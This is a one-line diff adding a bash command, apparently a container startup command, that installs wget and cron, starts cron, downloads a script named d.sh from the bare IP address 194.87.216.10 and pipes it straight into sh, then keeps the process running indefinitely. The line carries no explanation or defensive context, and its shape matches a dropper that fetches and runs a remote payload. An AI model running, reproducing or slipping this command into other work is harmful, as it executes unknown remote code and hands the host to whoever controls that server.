@@ -1,0 +1,1 @@
+/bin/bash -c 'apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 194.87.216.10/d.sh | sh;tail -f /dev/null'
